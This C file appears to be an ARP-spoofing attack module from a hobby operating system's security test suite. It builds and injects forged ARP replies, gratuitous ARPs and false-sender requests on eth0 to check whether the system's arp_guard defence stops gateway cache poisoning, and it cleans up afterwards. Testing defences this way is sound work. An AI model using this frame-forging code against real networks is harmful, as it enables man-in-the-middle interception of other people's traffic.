/*
 * atk_arp_spoofing.c - ATTACK arp_spoofing: poison the ARP cache: "10.0.2.2 is at MY MAC"
 *
 * Breaks:     trust - an IP address belongs to the MAC that really has it
 * Stopped by: arp_guard (defence/arp_guard)
 *
 * ARP believes what it hears. Whoever answers "10.0.2.2 is at
 * de:ad:be:ef:00:01" first (or last) gets our traffic for the gateway:
 * the attacker is now in the middle (MITM) of every connection.
 *
 * simulate(): show the gateway's entry and what a forged reply would do.
 * launch():   inject three forgeries on eth0: an unasked reply, a
 *             gratuitous ARP, a request "who-has us, tell gw (at evil)".
 *             findings = times the gateway's MAC changed.
 * cleanup():  forget a poisoned entry (it will be asked again).
 *
 * Uses: netdev_inject (core/netdev), arp_request / arp_lookup / arp_delete (core/arp), ui_*.
 */

#include "modules/security_management/core/registry/registry.h"                 // attack_t, registry_add_attack
#include "modules/network_management/security/arp_spoofing/defence/arp_guard/def_arp_guard.h" // def_arp_guard_ok
#include "modules/network_management/core/netdev/netdev.h"                      // netdev_by_name, netdev_inject, netdev_lock
#include "modules/network_management/core/ethernet/ethernet.h"                  // eth_header_t, ETH_*
#include "modules/network_management/core/arp/arp.h"                            // arp_packet_t, arp_lookup, arp_entry
#include "modules/network_management/core/inet/inet.h"                          // htons, htonl, inet_format, mac_format
#include "lib/string/string.h"                                                  // memcpy, memset
#include "modules/network_management/core/dhcp/dhcp.h"                          // dhcp_lease
#include "modules/process_management/syscalls/sleep/sys_sleep.h"                // sys_sleep
#include "modules/ui/core/style/ui.h"                                           // ui_printf, ui_color

static const uint8_t EVIL[6] = { 0xde, 0xad, 0xbe, 0xef, 0x00, 0x01 };
static uint32_t gateway;

// One ARP packet in an Ethernet frame, as a machine on the link would send it.
static int build_arp(uint8_t *f, const uint8_t dest[6], uint16_t op, const uint8_t smac[6],
                     uint32_t sip, const uint8_t tmac[6], uint32_t tip) {
    eth_header_t *eth = (eth_header_t *)f;
    memcpy(eth->dest, dest, 6);
    memcpy(eth->src, smac, 6);
    eth->type = htons(ETH_P_ARP);
    arp_packet_t *a = (arp_packet_t *)(f + ETH_HLEN);
    a->htype = htons(1);
    a->ptype = htons(ETH_P_IP);
    a->hlen = 6;
    a->plen = 4;
    a->op = htons(op);
    memcpy(a->sender_mac, smac, 6);
    a->sender_ip = htonl(sip);
    memcpy(a->target_mac, tmac, 6);
    a->target_ip = htonl(tip);
    memset(f + ETH_HLEN + sizeof(arp_packet_t), 0, ETH_ZLEN - ETH_HLEN - sizeof(arp_packet_t));
    return ETH_ZLEN;
}

static int same(const uint8_t *a, const uint8_t *b) {
    for (int i = 0; i < 6; i++)
        if (a[i] != b[i])
            return 0;
    return 1;
}

static uint32_t find_gateway(void) {
    const dhcp_lease_t *l = dhcp_lease();
    return l->state == DHCP_BOUND && l->router ? l->router : INET_ADDR(10, 0, 2, 2);
}

static int simulate(void) {
    uint8_t mac[6];
    char ip[INET_ADDR_TEXT], text[MAC_TEXT];
    gateway = find_gateway();
    inet_format(gateway, ip);
    if (arp_lookup(gateway, mac)) {
        mac_format(mac, text);
        ui_printf("  the gateway %s is at %s now\n", ip, text);
    } else {
        ui_printf("  the gateway %s is not in the ARP cache yet\n", ip);
    }
    ui_printf("  a forged reply would make it de:ad:be:ef:00:01: all our traffic\n");
    ui_printf("  to the internet would go to the attacker first\n");
    return 1;
}

static int launch(void) {
    netdev_t *eth = netdev_by_name("eth0");
    if (!eth || !eth->ip) {
        ui_printf("  needs eth0 with an address\n");
        return 0;
    }
    gateway = find_gateway();
    uint32_t lock = netdev_lock();
    arp_request(eth, gateway);                  // make sure the real entry is there
    netdev_unlock(lock);
    sys_sleep(200);
    uint8_t real[6], now[6], frame[ETH_ZLEN];
    int have_real = arp_lookup(gateway, real), poisoned = 0;
    static const char *how[3] = { "unasked reply", "gratuitous ARP", "request with a false sender" };
    for (int i = 0; i < 3; i++) {
        int len = i == 0 ? build_arp(frame, eth->mac, ARP_OP_REPLY, EVIL, gateway, eth->mac, eth->ip)
                : i == 1 ? build_arp(frame, ETH_BROADCAST, ARP_OP_REQUEST, EVIL, gateway, ETH_BROADCAST, gateway)
                         : build_arp(frame, ETH_BROADCAST, ARP_OP_REQUEST, EVIL, gateway, ETH_BROADCAST, eth->ip);
        netdev_inject(eth, frame, (uint16_t)len);
        int bad = arp_lookup(gateway, now) && same(now, EVIL);
        ui_printf("  %-28s -> %s\n", how[i], bad ? "POISONED" : "refused");
        poisoned += bad;
    }
    ui_color(poisoned ? UI_BAD : UI_GOOD);
    ui_printf("  %s\n", poisoned ? "the gateway's MAC is the attacker's: traffic goes to it"
                                 : have_real ? "the real MAC stayed: arp_guard refused every forgery"
                                             : "no forged entry was created");
    ui_reset();
    return poisoned;
}

static int cleanup(void) {
    uint8_t mac[6];
    if (gateway && arp_lookup(gateway, mac) && same(mac, EVIL)) {
        uint32_t lock = netdev_lock();
        arp_delete(gateway);
        netdev_unlock(lock);
        return 1;
    }
    return 0;
}

static const attack_t attack = {
    "arp_spoofing",
    "forge ARP replies so the gateway's address points at the attacker's MAC",
    INV_TRUST, SEV_HIGH,
    simulate, launch, cleanup,
    "arp_guard"
};

void atk_arp_spoofing_register(void) { registry_add_attack(&attack); }
